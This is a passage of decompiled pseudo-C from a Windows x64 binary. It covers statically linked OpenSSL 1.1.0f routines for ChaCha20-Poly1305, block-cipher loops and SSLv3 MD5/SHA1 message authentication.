      v13 = sub_140024CF0(a1);
      v14 = (__int128 *)sub_140024D20(a1);
      sub_140091340(
        a3,
        a2,
        0x8000000000000000ui64,
        v8,
        v14,
        (int)v16,
        v13,
        *(void (__fastcall **)(__int128 *, __int128 *, __int64))(v8 + 280));
      sub_140024D70(a1, v16[0]);
      --v12;
    }
    while ( v12 );
  }
  if ( a4 )
  {
    v16[0] = sub_140024D40(a1);
    v9 = sub_140024CF0(a1);
    v10 = (__int128 *)sub_140024D20(a1);
    v11 = 8 * a4;
    goto LABEL_8;
  }
  return 1i64;
}

//----- (000000014005A150) ----------------------------------------------------
__int64 __fastcall sub_14005A150(__int64 a1, _BYTE *a2, _BYTE *a3, unsigned __int64 a4)
{
  __int64 v8; // rsi
  void (__fastcall *v9)(_BYTE *, _BYTE *, unsigned __int64); // rbp
  _QWORD *v10; // rbx
  unsigned __int8 *v11; // rax
  unsigned int v13[4]; // [rsp+40h] [rbp-28h] BYREF

  v13[0] = sub_140024D40(a1);
  v8 = sub_140024D00(a1);
  v9 = *(void (__fastcall **)(_BYTE *, _BYTE *, unsigned __int64))(v8 + 288);
  v10 = (_QWORD *)__crt_stdio_input::format_string_parser<wchar_t>::scanset(a1);
  v11 = (unsigned __int8 *)sub_140024D20(a1);
  if ( v9 )
    sub_140090F60(a3, a2, a4, v8, v11, v10, v13, v9);
  else
    sub_140090D60(
      a3,
      a2,
      a4,
      v8,
      (__int64)v11,
      (__int64)v10,
      v13,
      *(void (__fastcall **)(__int64, __int64, __int64))(v8 + 280));
  sub_140024D70(a1, v13[0]);
  return 1i64;
}
// 140024CE0: using guessed type __int64 __fastcall __crt_stdio_input::format_string_parser<wchar_t>::scanset(_QWORD);

//----- (000000014005A240) ----------------------------------------------------
void *sub_14005A240()
{
  return &unk_1400FA230;
}

//----- (000000014005A250) ----------------------------------------------------
void *sub_14005A250()
{
  return &unk_1400FA3B0;
}

//----- (000000014005A260) ----------------------------------------------------
void *sub_14005A260()
{
  return &unk_1400FA350;
}

//----- (000000014005A270) ----------------------------------------------------
void *sub_14005A270()
{
  return &unk_1400FA410;
}

//----- (000000014005A280) ----------------------------------------------------
void *sub_14005A280()
{
  return &unk_1400FA470;
}

//----- (000000014005A290) ----------------------------------------------------
void *sub_14005A290()
{
  return &unk_1400FA290;
}

//----- (000000014005A2A0) ----------------------------------------------------
void *sub_14005A2A0()
{
  return &unk_1400FA2F0;
}

//----- (000000014005A2B0) ----------------------------------------------------
void *sub_14005A2B0()
{
  return &unk_1400FA4D0;
}

//----- (000000014005A2C0) ----------------------------------------------------
void *sub_14005A2C0()
{
  return &unk_1400FA650;
}

//----- (000000014005A2D0) ----------------------------------------------------
void *sub_14005A2D0()
{
  return &unk_1400FA5F0;
}

//----- (000000014005A2E0) ----------------------------------------------------
void *sub_14005A2E0()
{
  return &unk_1400FA6B0;
}

//----- (000000014005A2F0) ----------------------------------------------------
void *sub_14005A2F0()
{
  return &unk_1400FA710;
}

//----- (000000014005A300) ----------------------------------------------------
void *sub_14005A300()
{
  return &unk_1400FA530;
}

//----- (000000014005A310) ----------------------------------------------------
void *sub_14005A310()
{
  return &unk_1400FA590;
}

//----- (000000014005A320) ----------------------------------------------------
void *sub_14005A320()
{
  return &unk_1400FA770;
}

//----- (000000014005A330) ----------------------------------------------------
void *sub_14005A330()
{
  return &unk_1400FA8F0;
}

//----- (000000014005A340) ----------------------------------------------------
void *sub_14005A340()
{
  return &unk_1400FA890;
}

//----- (000000014005A350) ----------------------------------------------------
void *sub_14005A350()
{
  return &unk_1400FA950;
}

//----- (000000014005A360) ----------------------------------------------------
void *sub_14005A360()
{
  return &unk_1400FA9B0;
}

//----- (000000014005A370) ----------------------------------------------------
void *sub_14005A370()
{
  return &unk_1400FA7D0;
}

//----- (000000014005A380) ----------------------------------------------------
void *sub_14005A380()
{
  return &unk_1400FA830;
}

//----- (000000014005A390) ----------------------------------------------------
__int64 __fastcall sub_14005A390(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // r10
  unsigned __int8 *v4; // r9
  __int64 v5; // rbx
  int v6; // ecx
  unsigned __int64 v7; // rax
  unsigned __int8 *v8; // rdx
  __int64 v9; // r9
  int v10; // ecx
  unsigned __int64 v11; // rax
  __int64 result; // rax

  v3 = *(_QWORD *)(a1 + 112);
  if ( a2 )
  {
    v4 = (unsigned __int8 *)(a2 + 2);
    v5 = 8i64;
    do
    {
      v6 = *(v4 - 2) | ((*(v4 - 1) | ((*v4 | (v4[1] << 8)) << 8)) << 8);
      v7 = (unsigned __int64)&v4[-a2 - 2] >> 2;
      v4 += 4;
      *(_DWORD *)(v3 + 4 * v7) = v6;
      --v5;
    }
    while ( v5 );
  }
  if ( a3 )
  {
    v8 = (unsigned __int8 *)(a3 + 2);
    v9 = 4i64;
    do
    {
      v10 = *(v8 - 2) | ((*(v8 - 1) | ((*v8 | (v8[1] << 8)) << 8)) << 8);
      v11 = (unsigned __int64)&v8[-a3 - 2] >> 2;
      v8 += 4;
      *(_DWORD *)(v3 + 4 * v11 + 32) = v10;
      --v9;
    }
    while ( v9 );
  }
  result = 1i64;
  *(_DWORD *)(v3 + 112) = 0;
  return result;
}

//----- (000000014005A480) ----------------------------------------------------
__int64 __fastcall sub_14005A480(__int64 a1, _BYTE *a2, _BYTE *a3, __int64 a4)
{
  __int64 v4; // rbp
  unsigned int v6; // r8d
  unsigned int *v7; // rdi
  __int64 v8; // rsi
  __int64 v10; // rax
  char v11; // cl
  _OWORD *v13; // rax
  unsigned int v14; // r13d
  unsigned int v15; // r15d
  __int64 v16; // r12
  unsigned __int64 v17; // rsi
  unsigned __int64 v18; // rdi
  unsigned __int64 v19; // rdi
  __int64 v20; // rbp
  __int64 v21; // r14

  v4 = *(_QWORD *)(a1 + 112);
  v6 = *(_DWORD *)(v4 + 112);
  v7 = (unsigned int *)(v4 + 112);
  v8 = a4;
  if ( !v6 )
  {
LABEL_9:
    v13 = (_OWORD *)(v4 + 32);
    v14 = v8 & 0x3F;
    v15 = *(_DWORD *)(v4 + 32);
    v16 = v8 & 0x3F;
    v17 = v8 - v16;
    if ( v17 >= 0x40 )
    {
      do
      {
        v18 = v17 >> 6;
        if ( v17 >> 6 > 0x10000000 )
          v18 = 0x10000000i64;
        v15 += v18;
        if ( v15 < v18 )
        {
          v18 -= v15;
          v15 = 0;
        }
        v19 = v18 << 6;
        sub_140095570((unsigned __int64)a2, (unsigned __int64)a3, v19, (__int128 *)v4, (_OWORD *)(v4 + 32));
        v17 -= v19;
        *(_DWORD *)(v4 + 32) = v15;
        a3 += v19;
        a2 += v19;
        if ( !v15 )
          ++*(_DWORD *)(v4 + 36);
      }
      while ( v17 >= 0x40 );
      v13 = (_OWORD *)(v4 + 32);
      v7 = (unsigned int *)(v4 + 112);
      v16 = v14;
    }
    if ( v14 )
    {
      *(_QWORD *)(v4 + 48) = 0i64;
      *(_QWORD *)(v4 + 56) = 0i64;
      *(_QWORD *)(v4 + 64) = 0i64;
      *(_QWORD *)(v4 + 72) = 0i64;
      *(_QWORD *)(v4 + 80) = 0i64;
      *(_QWORD *)(v4 + 88) = 0i64;
      *(_QWORD *)(v4 + 96) = 0i64;
      *(_QWORD *)(v4 + 104) = 0i64;
      sub_140095570(v4 + 48, v4 + 48, 0x40ui64, (__int128 *)v4, v13);
      v20 = v4 - (_QWORD)a3;
      v21 = a2 - a3;
      do
      {
        a3[v21] = *a3 ^ a3[v20 + 48];
        ++a3;
        --v16;
      }
      while ( v16 );
      *v7 = v14;
    }
    return 1i64;
  }
  if ( a4 )
  {
    do
    {
      if ( v6 >= 0x40 )
        break;
      v10 = v6++;
      v11 = *a3++ ^ *(_BYTE *)(v10 + v4 + 48);
      *a2++ = v11;
      --v8;
    }
    while ( v8 );
  }
  *v7 = v6;
  if ( v8 )
  {
    if ( v6 == 64 )
    {
      *v7 = 0;
      if ( (*(_DWORD *)(v4 + 32))++ == -1 )
        ++*(_DWORD *)(v4 + 36);
    }
    goto LABEL_9;
  }
  return 1i64;
}
// 14005A5EE: conditional instruction was optimized away because r13d.4!=0

//----- (000000014005A640) ----------------------------------------------------
__int64 __fastcall sub_14005A640(__int64 a1, __int64 a2, const void *a3)
{
  __int64 v3; // rbx
  __int64 v6; // rcx
  __int64 v7; // r8
  __int64 v8; // rdx
  __int64 v9; // r11
  __int64 v10; // rbx
  __int64 v11; // rdi
  __int64 v12; // r10
  __int64 v13; // r9
  int v14; // ecx
  unsigned __int64 v15; // rax
  __int64 v17[2]; // [rsp+20h] [rbp-48h] BYREF
  __int64 v18; // [rsp+30h] [rbp-38h] BYREF

  v3 = *(_QWORD *)(a1 + 112);
  if ( a2 || a3 )
  {
    *(_QWORD *)(v3 + 152) = 0i64;
    *(_QWORD *)(v3 + 160) = 0i64;
    *(_QWORD *)(v3 + 168) = 0i64;
    *(_QWORD *)(v3 + 184) = -1i64;
    if ( a3 )
    {
      v17[0] = 0i64;
      v17[1] = 0i64;
      v6 = *(int *)(v3 + 180);
      if ( (int)v6 <= 16 )
        memmove((char *)&v18 - v6, a3, *(int *)(v3 + 180));
      sub_14005A390(a1, a2, (__int64)v17);
      *(_DWORD *)(v3 + 120) = *(_DWORD *)(v3 + 36);
      *(_DWORD *)(v3 + 124) = *(_DWORD *)(v3 + 40);
      *(_DWORD *)(v3 + 128) = *(_DWORD *)(v3 + 44);
    }
    else
    {
      v7 = *(_QWORD *)(a1 + 112);
      if ( a2 )
      {
        v8 = a2 + 2;
        v9 = a2 - v8;
        v10 = a2 - v8;
        v11 = a2 - v8;
        v12 = 8i64;
        v13 = -v8;
        do
        {
          v14 = *(unsigned __int8 *)(v11 + v8) | ((*(unsigned __int8 *)(v10 + v8 + 1) | ((*(unsigned __int8 *)v8 | (*(unsigned __int8 *)(v9 + v8 + 3) << 8)) << 8)) << 8);
          v15 = (unsigned __int64)(v13 + v8) >> 2;
          v8 += 4i64;
          *(_DWORD *)(v7 + 4 * v15) = v14;
          --v12;
        }
        while ( v12 );
      }
      *(_DWORD *)(v7 + 112) = 0;
    }
  }
  return 1i64;
}

//----- (000000014005A790) ----------------------------------------------------
__int64 __fastcall sub_14005A790(__int64 a1, char *a2, char *a3, size_t a4)
{
  __int64 v4; // rsi
  size_t v9; // rbp
  char *v10; // rdx
  char v12[16]; // [rsp+30h] [rbp-68h] BYREF

  v4 = *(_QWORD *)(a1 + 112);
  v9 = *(_QWORD *)(v4 + 184);
  if ( !*(_DWORD *)(v4 + 172) )
  {
    *(_DWORD *)(v4 + 32) = 0;
    *(_QWORD *)(v4 + 48) = 0i64;
    *(_QWORD *)(v4 + 56) = 0i64;
    *(_QWORD *)(v4 + 64) = 0i64;
    *(_QWORD *)(v4 + 72) = 0i64;
    *(_QWORD *)(v4 + 80) = 0i64;
    *(_QWORD *)(v4 + 88) = 0i64;
    *(_QWORD *)(v4 + 96) = 0i64;
    *(_QWORD *)(v4 + 104) = 0i64;
    sub_140095570(v4 + 48, v4 + 48, 0x40ui64, (__int128 *)v4, (_OWORD *)(v4 + 32));
    sub_140095B20(v4 + 192, (unsigned __int8 *)(v4 + 48));
    *(_DWORD *)(v4 + 32) = 1;
    *(_DWORD *)(v4 + 112) = 0;
    *(_QWORD *)(v4 + 160) = 0i64;
    *(_QWORD *)(v4 + 152) = 0i64;
    *(_DWORD *)(v4 + 172) = 1;
  }
  if ( !a3 )
    goto LABEL_18;
  if ( a2 )
  {
    if ( *(_DWORD *)(v4 + 168) )
    {
      if ( (*(_DWORD *)(v4 + 152) & 0xF) != 0 )
        sub_140095C80(v4 + 192, byte_1400FAA98, 16i64 - (*(_DWORD *)(v4 + 152) & 0xF));
      *(_DWORD *)(v4 + 168) = 0;
    }
    *(_QWORD *)(v4 + 184) = -1i64;
    if ( v9 == -1i64 )
    {
      v9 = a4;
    }
    else if ( a4 != v9 + 16 )
    {
      return 0xFFFFFFFFi64;
    }
    if ( *(_DWORD *)(a1 + 16) )
    {
      sub_14005A480(a1, a2, a3, v9);
      sub_140095C80(v4 + 192, a2, v9);
    }
    else
    {
      sub_140095C80(v4 + 192, a3, v9);
      sub_14005A480(a1, a2, a3, v9);
    }
    *(_QWORD *)(v4 + 160) += v9;
    a3 += v9;
    a2 += v9;
    if ( a3 && v9 == a4 )
      return (unsigned int)a4;
LABEL_18:
    if ( *(_DWORD *)(v4 + 168) )
    {
      if ( (*(_DWORD *)(v4 + 152) & 0xF) != 0 )
        sub_140095C80(v4 + 192, byte_1400FAA98, 16i64 - (*(_DWORD *)(v4 + 152) & 0xF));
      *(_DWORD *)(v4 + 168) = 0;
    }
    if ( (*(_DWORD *)(v4 + 160) & 0xF) != 0 )
      sub_140095C80(v4 + 192, byte_1400FAA98, 16i64 - (*(_DWORD *)(v4 + 160) & 0xF));
    sub_140095C80(v4 + 192, (char *)(v4 + 152), 0x10ui64);
    v10 = (char *)(v4 + 132);
    if ( !*(_DWORD *)(a1 + 16) )
      v10 = v12;
    sub_140095A80(v4 + 192, (__int64)v10);
    *(_DWORD *)(v4 + 172) = 0;
    if ( !a3 || a4 == v9 )
    {
      if ( *(_DWORD *)(a1 + 16) || !(unsigned int)sub_140023460(v12, v4 + 132, *(int *)(v4 + 176)) )
        return (unsigned int)a4;
    }
    else
    {
      if ( *(_DWORD *)(a1 + 16) )
      {
        *(_OWORD *)a2 = *(_OWORD *)(v4 + 132);
        return (unsigned int)a4;
      }
      if ( !(unsigned int)sub_140023460(v12, (__int64)a3, 16i64) )
        return (unsigned int)a4;
      memset(&a2[-v9], 0, v9);
    }
    return 0xFFFFFFFFi64;
  }
  sub_140095C80(v4 + 192, a3, a4);
  *(_QWORD *)(v4 + 152) += a4;
  *(_DWORD *)(v4 + 168) = 1;
  return (unsigned int)a4;
}

//----- (000000014005AA80) ----------------------------------------------------
__int64 __fastcall sub_14005AA80(__int64 a1)
{
  __int64 v2; // rax

  if ( *(_QWORD *)(a1 + 112) )
  {
    v2 = sub_140095D70();
    sub_140023440(*(_QWORD *)(a1 + 112), v2 + 192);
  }
  return 1i64;
}

//----- (000000014005AAC0) ----------------------------------------------------
__int64 __fastcall sub_14005AAC0(__int64 a1, int a2, int a3, __int64 *a4)
{
  _DWORD *v4; // rbx
  __int64 *v5; // rdi
  __int64 v8; // rax
  _DWORD *v9; // rax
  __int64 result; // rax
  __int64 v11; // rax
  void *v12; // rax
  int v13; // ecx
  int v14; // ecx
  int v15; // ecx
  unsigned int v16; // ecx
  __int64 v17; // xmm0_8
  __int64 v18; // [rsp+30h] [rbp-38h] BYREF
  __int16 v19; // [rsp+38h] [rbp-30h]
  unsigned __int8 v20; // [rsp+3Ah] [rbp-2Eh]
  char v21; // [rsp+3Bh] [rbp-2Dh]
  char v22; // [rsp+3Ch] [rbp-2Ch]

  v4 = *(_DWORD **)(a1 + 112);
  v5 = a4;
  switch ( a2 )
  {
    case 0:
      if ( !v4 )
      {
        v8 = sub_140095D70();
        v9 = sub_14001DC20(v8 + 192);
        *(_QWORD *)(a1 + 112) = v9;
        v4 = v9;
        if ( !v9 )
        {
          sub_140024610(6, 182, 134, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\e_chacha20_poly1305.c", 334);
          return 0i64;
        }
      }
      v4[45] = 12;
      *((_QWORD *)v4 + 19) = 0i64;
      *((_QWORD *)v4 + 20) = 0i64;
      *((_QWORD *)v4 + 21) = 0i64;
      v4[44] = 0;
      *((_QWORD *)v4 + 23) = -1i64;
      return 1i64;
    case 8:
      if ( !v4 )
        return 1i64;
      v11 = sub_140095D70();
      v12 = sub_14003BAB0(v4, v11 + 192);
      v5[14] = (__int64)v12;
      if ( v12 )
        return 1i64;
      sub_140024610(6, 182, 173, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\e_chacha20_poly1305.c", 353);
      return 0i64;
    case 9:
      if ( (unsigned int)(a3 - 1) > 0xF )
        return 0i64;
      v4[45] = a3;
      return 1i64;
    case 16:
      if ( (unsigned int)(a3 - 1) > 0xF || !*(_DWORD *)(a1 + 16) )
        return 0i64;
      memmove(a4, v4 + 33, a3);
      return 1i64;
    case 17:
      if ( (unsigned int)(a3 - 1) > 0xF )
        return 0i64;
      if ( a4 )
      {
        memmove(v4 + 33, a4, a3);
        v4[44] = a3;
      }
      return 1i64;
    case 18:
      if ( a3 != 12 )
        return 0i64;
      v13 = *(unsigned __int8 *)a4 | ((*((unsigned __int8 *)a4 + 1) | (*((unsigned __int16 *)a4 + 1) << 8)) << 8);
      v4[9] = v13;
      v4[30] = v13;
      v14 = *((unsigned __int8 *)a4 + 4) | ((*((unsigned __int8 *)a4 + 5) | (*((unsigned __int16 *)a4 + 3) << 8)) << 8);
      v4[10] = v14;
      v4[31] = v14;
      v15 = *((unsigned __int8 *)a4 + 8) | ((*((unsigned __int8 *)a4 + 9) | (*((unsigned __int16 *)a4 + 5) << 8)) << 8);
      result = 1i64;
      v4[11] = v15;
      v4[32] = v15;
      return result;
    case 22:
      if ( a3 != 13 )
        return 0i64;
      v16 = *((unsigned __int8 *)a4 + 12) | (*((unsigned __int8 *)a4 + 11) << 8);
      if ( *(_DWORD *)(a1 + 16) )
        goto LABEL_26;
      if ( v16 < 0x10 )
        return 0i64;
      v5 = &v18;
      v17 = *a4;
      v16 -= 16;
      v19 = *((_WORD *)a4 + 4);
      v20 = *((_BYTE *)a4 + 10);
      v21 = BYTE1(v16);
      v18 = v17;
      v22 = v16;
LABEL_26:
      *((_QWORD *)v4 + 23) = v16;
      v4[9] = v4[30];
      v4[10] = v4[31] ^ (*(unsigned __int8 *)v5 | ((*((unsigned __int8 *)v5 + 1) | (*((unsigned __int16 *)v5 + 1) << 8)) << 8));
      v4[11] = v4[32] ^ (*((unsigned __int8 *)v5 + 4) | ((*((unsigned __int8 *)v5 + 5) | (*((unsigned __int16 *)v5 + 3) << 8)) << 8));
      v4[43] = 0;
      sub_14005A790(a1, 0i64, (char *)v5, 0xDui64);
      return 16i64;
    case 23:
      return 1i64;
    default:
      return 0xFFFFFFFFi64;
  }
}

//----- (000000014005AE60) ----------------------------------------------------
void *sub_14005AE60()
{
  return &unk_1400FAA40;
}

//----- (000000014005AE70) ----------------------------------------------------
void *sub_14005AE70()
{
  return &unk_1401356F0;
}

//----- (000000014005AE80) ----------------------------------------------------
__int64 __fastcall sub_14005AE80(__int64 a1, unsigned __int8 *a2)
{
  int *v3; // rax

  v3 = (int *)sub_140024D00(a1);
  sub_140097F60(a2, v3);
  return 1i64;
}

//----- (000000014005AEB0) ----------------------------------------------------
__int64 __fastcall sub_14005AEB0(__int64 a1, char *a2, char *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rbp
  unsigned __int64 v8; // rsi
  int v9; // edi
  char *v10; // rbx
  __int64 v11; // rax
  int v12; // edi
  char *v13; // rbx
  __int64 v14; // rax
  __int64 v16; // [rsp+28h] [rbp-20h]

  v4 = a4;
  if ( a4 >= 0x40000000 )
  {
    v8 = a4 >> 30;
    v4 = -1073741824i64 * (a4 >> 30) + a4;
    do
    {
      v9 = sub_140024CF0(a1);
      v10 = (char *)sub_140024D20(a1);
      v11 = sub_140024D00(a1);
      LODWORD(v16) = v9;
      sub_140098AF0(a3, a2, 0x40000000ui64, v11, v10, v16);
      a3 += 0x40000000;
      a2 += 0x40000000;
      --v8;
    }
    while ( v8 );
  }
  if ( v4 )
  {
    v12 = sub_140024CF0(a1);
    v13 = (char *)sub_140024D20(a1);
    v14 = sub_140024D00(a1);
    LODWORD(v16) = v12;
    sub_140098AF0(a3, a2, (int)v4, v14, v13, v16);
  }
  return 1i64;
}
// 14005AF35: variable 'v16' is possibly undefined

//----- (000000014005AFB0) ----------------------------------------------------
__int64 __fastcall sub_14005AFB0(__int64 a1, _BYTE *a2, _BYTE *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rbx
  unsigned __int64 v5; // rbp
  int v9; // edi
  __int64 v10; // rsi
  __int64 v11; // rax
  int v13; // [rsp+88h] [rbp+20h] BYREF

  v4 = 0x40000000i64;
  v5 = a4;
  if ( a4 < 0x40000000 )
    v4 = a4;
  if ( !a4 )
    return 1i64;
  do
  {
    if ( v5 < v4 )
      break;
    v13 = sub_140024D40(a1);
    v9 = sub_140024CF0(a1);
    v10 = sub_140024D20(a1);
    v11 = sub_140024D00(a1);
    sub_140098B30(a3, a2, (int)v5, v11, v10, (unsigned int *)&v13, v9);
    sub_140024D70(a1, v13);
    v5 -= v4;
    a3 += v4;
    a2 += v4;
    if ( v5 < v4 )
      v4 = v5;
  }
  while ( v5 );
  return 1i64;
}

//----- (000000014005B0A0) ----------------------------------------------------
__int64 __fastcall sub_14005B0A0(__int64 a1, __int64 a2, unsigned __int8 *a3, unsigned __int64 a4)
{
  unsigned __int64 v8; // r12
  unsigned __int64 v9; // rsi
  __int64 v10; // r15
  __int64 v11; // r14
  int v12; // ebx
  __int64 v13; // rax

  v8 = *(int *)(sub_140021BD0(a1) + 4);
  if ( a4 >= v8 )
  {
    v9 = a4 - v8;
    v10 = a2 - (_QWORD)a3;
    v11 = -(__int64)a3;
    do
    {
      v12 = sub_140024CF0(a1);
      v13 = sub_140024D00(a1);
      sub_140098AC0(a3, &a3[v10], v13, v12);
      a3 += v8;
    }
    while ( (unsigned __int64)&a3[v11] <= v9 );
  }
  return 1i64;
}

//----- (000000014005B150) ----------------------------------------------------
__int64 __fastcall sub_14005B150(__int64 a1, _BYTE *a2, _BYTE *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rbp
  unsigned __int64 v8; // rsi
  __int64 v9; // rbx
  __int64 v10; // rax
  __int64 v11; // rbx
  __int64 v12; // rax
  int v14; // [rsp+68h] [rbp+20h] BYREF

  v4 = a4;
  if ( a4 >= 0x40000000 )
  {
    v8 = a4 >> 30;
    v4 = -1073741824i64 * (a4 >> 30) + a4;
    do
    {
      v14 = sub_140024D40(a1);
      v9 = sub_140024D20(a1);
      v10 = sub_140024D00(a1);
      sub_140098B80(a3, a2, 0x40000000ui64, v10, v9, (unsigned int *)&v14);
      sub_140024D70(a1, v14);
      a3 += 0x40000000;
      a2 += 0x40000000;
      --v8;
    }
    while ( v8 );
  }
  if ( v4 )
  {
    v14 = sub_140024D40(a1);
    v11 = sub_140024D20(a1);
    v12 = sub_140024D00(a1);
    sub_140098B80(a3, a2, (int)v4, v12, v11, (unsigned int *)&v14);
    sub_140024D70(a1, v14);
  }
  return 1i64;
}

//----- (000000014005B270) ----------------------------------------------------
void *sub_14005B270()
{
  return &unk_1400FAAE0;
}

//----- (000000014005B280) ----------------------------------------------------
void *sub_14005B280()
{
  return &unk_1400FAB40;
}

//----- (000000014005B290) ----------------------------------------------------
void *sub_14005B290()
{
  return &unk_1400FAC00;
}

//----- (000000014005B2A0) ----------------------------------------------------
void *sub_14005B2A0()
{
  return &unk_1400FABA0;
}

//----- (000000014005B2B0) ----------------------------------------------------
__int64 __fastcall sub_14005B2B0(__int64 a1)
{
  _DWORD *v1; // rax

  v1 = (_DWORD *)sub_14001C740(a1);
  return sub_140088590(v1);
}

//----- (000000014005B2D0) ----------------------------------------------------
__int64 __fastcall sub_14005B2D0(__int64 a1, unsigned __int8 *a2, size_t a3)
{
  __int64 v5; // rax

  v5 = sub_14001C740(a1);
  return sub_140098D30(v5, a2, a3);
}

//----- (000000014005B310) ----------------------------------------------------
__int64 __fastcall sub_14005B310(__int64 a1, __int64 a2)
{
  __int64 v3; // rax

  v3 = sub_14001C740(a1);
  return sub_140098BC0(a2, v3);
}

//----- (000000014005B340) ----------------------------------------------------
void *sub_14005B340()
{
  return &unk_1400FAC60;
}

//----- (000000014005B350) ----------------------------------------------------
__int64 __fastcall sub_14005B350(__int64 a1, unsigned __int8 *a2, size_t a3)
{
  __int64 v5; // rax

  v5 = sub_14001C740(a1);
  return sub_1400885E0(v5, a2, a3);
}

//----- (000000014005B390) ----------------------------------------------------
__int64 __fastcall sub_14005B390(__int64 a1, __int64 a2)
{
  __int64 v3; // rax

  v3 = sub_14001C740(a1);
  return sub_140088420(a2, v3);
}

//----- (000000014005B3C0) ----------------------------------------------------
void *sub_14005B3C0()
{
  return &unk_1400FACB0;
}

//----- (000000014005B3D0) ----------------------------------------------------
__int64 __fastcall sub_14005B3D0(__int64 a1)
{
  _DWORD *v1; // rbx
  __int64 result; // rax

  v1 = (_DWORD *)sub_14001C740(a1);
  result = sub_140088590(v1);
  if ( (_DWORD)result )
    return sub_14005C560(v1 + 23);
  return result;
}

//----- (000000014005B410) ----------------------------------------------------
__int64 __fastcall sub_14005B410(__int64 a1, unsigned __int8 *a2, size_t a3)
{
  __int64 v5; // rsi
  __int64 result; // rax

  v5 = sub_14001C740(a1);
  result = sub_1400885E0(v5, a2, a3);
  if ( (_DWORD)result )
    return sub_14005C5B0(v5 + 92, (unsigned int *)a2, a3);
  return result;
}

//----- (000000014005B480) ----------------------------------------------------
__int64 __fastcall sub_14005B480(__int64 a1, __int64 a2)
{
  __int64 v3; // rdi
  __int64 result; // rax

  v3 = sub_14001C740(a1);
  result = sub_140088420(a2, v3);
  if ( (_DWORD)result )
    return sub_14005C3D0((_BYTE *)(a2 + 16), (int *)(v3 + 92));
  return result;
}

//----- (000000014005B4D0) ----------------------------------------------------
__int64 __fastcall sub_14005B4D0(__int64 a1, int a2, int a3, unsigned __int8 *a4)
{
  __int64 v8; // rdi
  __int64 v9[6]; // [rsp+20h] [rbp-78h] BYREF
  unsigned __int8 v10[16]; // [rsp+50h] [rbp-48h] BYREF
  unsigned int v11[6]; // [rsp+60h] [rbp-38h] BYREF

  if ( a2 != 29 )
    return 4294967294i64;
  if ( !a1 )
    return 0i64;
  v8 = sub_14001C740(a1);
  if ( a3 != 48 )
    return 0i64;
  if ( (int)sub_14005B410(a1, a4, 0x30ui64) <= 0 )
    return 0i64;
  memset(v9, 54, sizeof(v9));
  if ( !(unsigned int)sub_1400885E0(v8, (unsigned __int8 *)v9, 0x30ui64) )
    return 0i64;
  if ( !(unsigned int)sub_140088420((__int64)v10, v8) )
    return 0i64;
  if ( !(unsigned int)sub_14005C5B0(v8 + 92, (unsigned int *)v9, 0x28ui64) )
    return 0i64;
  if ( !(unsigned int)sub_14005C3D0(v11, (int *)(v8 + 92)) )
    return 0i64;
  if ( !(unsigned int)sub_14005B3D0(a1) )
    return 0i64;
  if ( (int)sub_14005B410(a1, a4, 0x30ui64) <= 0 )
    return 0i64;
  memset(v9, 92, sizeof(v9));
  if ( !(unsigned int)sub_1400885E0(v8, (unsigned __int8 *)v9, 0x30ui64)
    || !(unsigned int)sub_1400885E0(v8, v10, 0x10ui64)
    || !(unsigned int)sub_14005C5B0(v8 + 92, (unsigned int *)v9, 0x28ui64)
    || !(unsigned int)sub_14005C5B0(v8 + 92, v11, 0x14ui64) )
  {
    return 0i64;
  }
  sub_140023440((__int64)v10, 16i64);
  sub_140023440((__int64)v11, 20i64);
  return 1i64;
}
// 14005B4D0: using guessed type unsigned int var_38[6];

//----- (000000014005B6B0) ----------------------------------------------------
void *sub_14005B6B0()
{
  return &unk_1400FAD00;
}

//----- (000000014005B6C0) ----------------------------------------------------
__int64 __fastcall sub_14005B6C0(__int64 a1)
{
  _QWORD *v1; // rax

  v1 = (_QWORD *)sub_14001C740(a1);
  return sub_1400996F0(v1);
}

//----- (000000014005B6E0) ----------------------------------------------------
__int64 __fastcall sub_14005B6E0(__int64 a1, __m128i *a2, unsigned __int64 a3)
{
  __m128i *v5; // rax

  v5 = (__m128i *)sub_14001C740(a1);
  return sub_140099770(v5, a2, a3);
}

//----- (000000014005B720) ----------------------------------------------------
__int64 __fastcall sub_14005B720(__int64 a1, char *a2)
{
  __m128i *v3; // rax

  v3 = (__m128i *)sub_14001C740(a1);
  return sub_140099660(a2, v3);
}

//----- (000000014005B750) ----------------------------------------------------
void *sub_14005B750()
{
  return &unk_1400FAD50;
}

//----- (000000014005B760) ----------------------------------------------------
__int64 __fastcall sub_14005B760(__int64 a1)
{
  _OWORD *v1; // rax

  v1 = (_OWORD *)sub_14001C740(a1);
  return sub_14009BEB0(v1);
}

//----- (000000014005B780) ----------------------------------------------------
__int64 __fastcall sub_14005B780(__int64 a1, __m128i *a2, unsigned __int64 a3)
{
  __m128i *v5; // rax

  v5 = (__m128i *)sub_14001C740(a1);
  return sub_14009BF70(v5, a2, a3);
}

//----- (000000014005B7C0) ----------------------------------------------------
__int64 __fastcall sub_14005B7C0(__int64 a1, char *a2)
{
  __m128i *v3; // rax

  v3 = (__m128i *)sub_14001C740(a1);
  return sub_14009BE20(a2, v3);
}

//----- (000000014005B7F0) ----------------------------------------------------
void *sub_14005B7F0()
{
  return &unk_1400FADA0;
}

//----- (000000014005B800) ----------------------------------------------------
__int64 __fastcall sub_14005B800(__int64 a1, int a2, int a3, unsigned int *a4)
{
  __int64 v7; // rax
  int *v8; // rbx
  __int64 v9[5]; // [rsp+20h] [rbp-68h] BYREF
  unsigned int v10[6]; // [rsp+48h] [rbp-40h] BYREF

  if ( a2 != 29 )
    return 4294967294i64;
  if ( !a1 )
    return 0i64;
  v7 = sub_14001C740(a1);
  v8 = (int *)v7;
  if ( a3 != 48 )
    return 0i64;
  if ( (int)sub_14005C5B0(v7, a4, 0x30ui64) <= 0 )
    return 0i64;
  memset(v9, 54, sizeof(v9));
  if ( !(unsigned int)sub_14005C5B0((__int64)v8, (unsigned int *)v9, 0x28ui64) )
    return 0i64;
  if ( !(unsigned int)sub_14005C3D0(v10, v8) )
    return 0i64;
  if ( !(unsigned int)sub_14005C560(v8) )
    return 0i64;
  if ( (int)sub_14005C5B0((__int64)v8, a4, 0x30ui64) <= 0 )
    return 0i64;
  memset(v9, 92, sizeof(v9));
  if ( !(unsigned int)sub_14005C5B0((__int64)v8, (unsigned int *)v9, 0x28ui64)
